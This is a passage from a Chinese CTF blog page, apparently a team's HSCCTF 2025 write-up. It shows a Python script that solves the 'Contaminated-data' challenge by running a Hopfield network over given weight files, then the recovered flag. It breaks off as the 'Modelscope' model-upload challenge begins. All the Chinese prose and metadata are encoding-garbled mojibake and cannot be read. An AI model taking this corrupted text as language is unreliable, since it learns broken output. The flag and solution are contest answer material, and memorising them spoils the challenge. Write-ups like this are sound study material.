<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>HSCCTF 2025 | Lazzaro</title><meta name="description" content="â€‹     æœ¬å±ŠHSCCTF 2025æ˜¯ç”±ä¸­é¾™æŠ€æœ¯è”åˆæ•°æ”¯ç¤¾ä¼šæˆ˜é˜Ÿä¸¾åŠã€‚æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–WEBã€CRYPTOã€MISCã€PWNã€REVERSEã€OSINTç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚ Rank: 3  Artificial IntelligenceContaminated-data2025é•¿åŸæ¯åŸé¢˜ã€‚ ç»™äº†ä¸€ä¸ªweights.npyå’Œä¸€ä¸ªc.npyï¼Œç”¨numpyåŠ è½½"><meta property="og:type" content="article"><meta property="og:title" content="HSCCTF 2025"><meta property="og:url" content="https://lazzzaro.github.io/2025/12/11/match-HSCCTF-2025/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="â€‹     æœ¬å±ŠHSCCTF 2025æ˜¯ç”±ä¸­é¾™æŠ€æœ¯è”åˆæ•°æ”¯ç¤¾ä¼šæˆ˜é˜Ÿä¸¾åŠã€‚æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–WEBã€CRYPTOã€MISCã€PWNã€REVERSEã€OSINTç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚ Rank: 3  Artificial IntelligenceContaminated-data2025é•¿åŸæ¯åŸé¢˜ã€‚ ç»™äº†ä¸€ä¸ªweights.npyå’Œä¸€ä¸ªc.npyï¼Œç”¨numpyåŠ è½½"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2025/12/11/match-HSCCTF-2025/image-20251211110505564.png"><meta property="article:published_time" content="2025-12-11T10:16:22.000Z"><meta property="article:modified_time" content="2025-12-11T10:18:58.417Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2025èµ›"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2025/12/11/match-HSCCTF-2025/image-20251211110505564.png"><link rel="canonical" href="https://lazzzaro.github.io/2025/12/11/match-HSCCTF-2025/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFå¼±é¸¡è‡ªè¿›é˜¶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="æœç´¢"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">æ€»è§ˆ</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">æ±‡æ€»</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">ç±»åˆ«</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">å…³é”®è¯</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">æ¥ç•™ä¸ªè¨€ ğŸ‘‰ğŸ‘‰ğŸ‘‰</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">ç±»åˆ«</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">53</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">å…³é”®è¯äº‘</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020èµ›</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.88px">2021èµ›</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.63px">2022èµ›</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.75px">2023èµ›</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.25px">2024èµ›</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13.38px">2025èµ›</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.13px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.25px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.13px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.13px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.5px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">å†…ç½‘</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">ååºåˆ—åŒ–</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">åç¼–è¯‘</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">åè°ƒè¯•</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">å–è¯</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">åé‡å­å¯†ç </a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">å‘½ä»¤è¡Œ</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">å›¾åƒ</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">å—å¯†ç </a> <a href="/tags/%E5%A0%86/" style="font-size:13px">å †</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.13px">å¯†ç </a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">ææƒ</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">æ–‡ä»¶ä¸Šä¼ </a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">æ›²çº¿</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">æ ˆ</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">æ ¼å¯†ç </a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">æ³¨å…¥</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">æµå¯†ç </a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">æµé‡</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">æ··æ·†</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">æ¸—é€</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">ç¦»æ•£å¯¹æ•°</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.13px">ç®—æ³•</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.5px">ç»•è¿‡</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">ç¼–ç </a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.13px">è„šæœ¬</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">è‡ªåŠ¨åŒ–</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">é€ƒé€¸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.25px">éšå†™</a></div></div><div class="widget"><h3 class="widget-title">æ±‡æ€»</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/12/">åäºŒæœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">åæœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">å…«æœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">å…­æœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">åäºŒæœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">åä¸€æœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">ä¸‰æœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">åä¸€æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">ä¹æœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">äº”æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">äºŒæœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">ä¸€æœˆ 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">åäºŒæœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">åä¸€æœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">ä¹æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">ä¸ƒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">å…­æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">äº”æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">äºŒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">ä¸€æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">åäºŒæœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">åä¸€æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">åæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">ä¹æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">å…«æœˆ 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">å…­æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">äº”æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">å››æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">ä¸‰æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">äºŒæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">ä¸€æœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">åäºŒæœˆ 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">åä¸€æœˆ 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">åæœˆ 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">ä¹æœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">å…«æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">ä¸ƒæœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">å…­æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">äº”æœˆ 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">æ–‡ç« ç›®å½•</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Artificial-Intelligence"><span class="toc-number">1.</span> <span class="toc-text">Artificial Intelligence</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Contaminated-data"><span class="toc-number">1.1.</span> <span class="toc-text">Contaminated-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Modelscope"><span class="toc-number">1.2.</span> <span class="toc-text">Modelscope</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-Cloud"><span class="toc-number">2.1.</span> <span class="toc-text">Baby Cloud</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Horse"><span class="toc-number">2.2.</span> <span class="toc-text">Horse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Purple-Moon"><span class="toc-number">2.3.</span> <span class="toc-text">Purple Moon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gogogo"><span class="toc-number">2.4.</span> <span class="toc-text">Gogogo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-capsule"><span class="toc-number">2.5.</span> <span class="toc-text">Time capsule</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">3.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ancient"><span class="toc-number">3.1.</span> <span class="toc-text">Ancient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-in"><span class="toc-number">3.2.</span> <span class="toc-text">Sign_in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Math"><span class="toc-number">3.3.</span> <span class="toc-text">Math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZRSA"><span class="toc-number">3.4.</span> <span class="toc-text">EZRSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Where"><span class="toc-number">3.5.</span> <span class="toc-text">Where</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#StillRSA"><span class="toc-number">3.6.</span> <span class="toc-text">StillRSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abg"><span class="toc-number">3.7.</span> <span class="toc-text">Abg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1ZRSA"><span class="toc-number">3.8.</span> <span class="toc-text">1ZRSA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">4.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign"><span class="toc-number">4.1.</span> <span class="toc-text">Sign</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ezvm"><span class="toc-number">4.2.</span> <span class="toc-text">Ezvm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN1"><span class="toc-number">5.1.</span> <span class="toc-text">PWN1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN2"><span class="toc-number">5.2.</span> <span class="toc-text">PWN2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN3"><span class="toc-number">5.3.</span> <span class="toc-text">PWN3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN4"><span class="toc-number">5.4.</span> <span class="toc-text">PWN4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN6"><span class="toc-number">5.5.</span> <span class="toc-text">PWN6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN7"><span class="toc-number">5.6.</span> <span class="toc-text">PWN7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">6.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-in-1"><span class="toc-number">6.1.</span> <span class="toc-text">Sign_in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Signin-WhoRwe"><span class="toc-number">6.2.</span> <span class="toc-text">Signin_WhoRwe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Harris"><span class="toc-number">6.3.</span> <span class="toc-text">Harris</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CALC"><span class="toc-number">6.4.</span> <span class="toc-text">CALC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hidden-bullet-comments"><span class="toc-number">6.5.</span> <span class="toc-text">Hidden bullet comments</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-HSCCTF-2025" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">HSCCTF 2025</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2025/12/11/match-HSCCTF-2025/" class="article-date"><time datetime="2025-12-11T10:16:22.000Z" itemprop="datePublished">2025-12-11</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2025%E8%B5%9B/" rel="tag">2025èµ›</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2025/12/11/match-HSCCTF-2025/" class="leancloud_visitors" data-flag-title="HSCCTF 2025"><span class="leancloud-visitors-count">âˆ</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2025/12/11/match-HSCCTF-2025/#comments" class="article-comment-link">è¯„è®º</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>â€‹</p><p>æœ¬å±ŠHSCCTF 2025æ˜¯ç”±ä¸­é¾™æŠ€æœ¯è”åˆæ•°æ”¯ç¤¾ä¼šæˆ˜é˜Ÿä¸¾åŠã€‚<br>æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–WEBã€CRYPTOã€MISCã€PWNã€REVERSEã€OSINTç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚</p><p><strong>Rank: 3</strong></p><hr><h2 id="Artificial-Intelligence"><a href="#Artificial-Intelligence" class="headerlink" title="Artificial Intelligence"></a>Artificial Intelligence</h2><h3 id="Contaminated-data"><a href="#Contaminated-data" class="headerlink" title="Contaminated-data"></a>Contaminated-data</h3><p>2025é•¿åŸæ¯åŸé¢˜ã€‚</p><p>ç»™äº†ä¸€ä¸ªweights.npyå’Œä¸€ä¸ªc.npyï¼Œç”¨numpyåŠ è½½å¹¶æŸ¥çœ‹æ•°æ®å’Œå½¢çŠ¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">weight = np.load(<span class="string">&#x27;weights.npy&#x27;</span>)</span><br><span class="line">c = np.load(<span class="string">&#x27;c.npy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(weight)</span><br><span class="line"><span class="built_in">print</span>(weight.shape)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(c.shape)</span><br></pre></td></tr></table></figure><p>weightæ˜¯æ˜¯ <code>304*304</code> çš„çŸ©é˜µï¼Œè€Œcæ˜¯ <code>4*76=304</code> åˆšå¥½ä¹Ÿæ˜¯304ï¼Œæ•°æ®å…¨æ˜¯0å’Œ1ã€‚</p><p>ç»“åˆé¢˜ç›®åå­—æ¨æµ‹å¯èƒ½æ˜¯è¦æ¢å¤å›¾ç‰‡ï¼Œç”± <code>4*76=304</code> å’Œ <code>304*304</code> çš„çŸ©é˜µå¯çŸ¥ï¼Œweight[i][j]è¡¨ç¤ºåƒç´ iå’Œjä¹‹é—´çš„è¿æ¥å¼ºåº¦ï¼Œè¯´æ˜æ˜¯ä¸€ä¸ªå…¨è¿æ¥ç»“æ„çš„hopfieldç½‘ç»œï¼Œç›´æ¥åŠ æƒè®¡ç®—ï¼Œåˆ¤æ–­æ”¶æ•›åå¾—åˆ°ä¸€ä¸ªç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">weight = np.load(<span class="string">&#x27;weights.npy&#x27;</span>)</span><br><span class="line">c = np.load(<span class="string">&#x27;c.npy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">v = c.flatten().copy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    updated_v = np.zeros_like(v)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        total = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">            <span class="keyword">if</span> i != j:</span><br><span class="line">                total += weight[i, j] * v[i]</span><br><span class="line">        updated_v[j] = <span class="number">1</span> <span class="keyword">if</span> total &gt;= <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> np.array_equal(updated_v, v):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Converged after <span class="subst">&#123;t&#125;</span> iterations&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    v = updated_v.copy()</span><br><span class="line"></span><br><span class="line">result = v.reshape(<span class="number">4</span>, <span class="number">76</span>)</span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>, <span class="number">4</span>))</span><br><span class="line">plt.imshow(result)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><p><img src="/2025/12/11/match-HSCCTF-2025/image-20251211110505564.png" alt="image-20251211110505564"></p><p>flagï¼š</p><p><code>flag&#123;flove_all_hurt&#125;</code></p><p>â€‹</p><h3 id="Modelscope"><a href="#Modelscope" class="headerlink" title="Modelscope"></a>Modelscope</h3><p>2025é•¿åŸæ¯åŸé¢˜ Mini-modelscopeã€‚</p><p>ä¸Šä¼ æ¨¡å‹ï¼šæœåŠ¡å™¨ä¼šè§£å‹ model.zip å¹¶å°è¯•åŠ è½½æ¨¡å‹ã€‚</p><p>è¾“å…¥å›ºå®šï¼šé»˜è®¤ä¼šè°ƒç”¨ signature è¾“å…¥ 